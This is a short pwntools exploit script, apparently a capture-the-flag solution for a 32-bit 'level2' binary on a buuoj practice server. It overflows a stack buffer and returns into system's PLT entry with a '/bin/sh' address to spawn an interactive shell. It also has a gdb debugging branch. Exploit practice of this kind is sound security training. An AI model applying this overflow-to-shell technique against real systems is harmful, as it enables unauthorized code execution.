from pwn import *
file_path='./level2'
context(binary=file_path,os='linux',terminal = ['tmux', 'sp', '-h'])
glibc_version="2.23"
_debug_=1

elf = ELF(file_path)
#pwn.io init
if _debug_:
    pwn_file="/glibc/%s/32/lib/ld-%s.so --library-path /glibc/%s/32/lib/ %s"%(glibc_version,glibc_version,glibc_version,file_path)
    p = process(pwn_file.split())
    libc = ELF('/glibc/%s/32/lib/libc-%s.so'%(glibc_version,glibc_version))
else:
    p = remote('node3.buuoj.cn',28124)
    libc = ELF('../libc/u16/x86libc-2.23.so')

system_plt = elf.plt['system']
main_addr = 0x08048480
binsh = 0x0804A024

payload = b'a'*0x88+b'b'*4+p32(system_plt)+p32(main_addr)+p32(binsh)
gdb.attach(p,'b *0x0804847E')
p.sendafter('Input',payload)
p.interactive()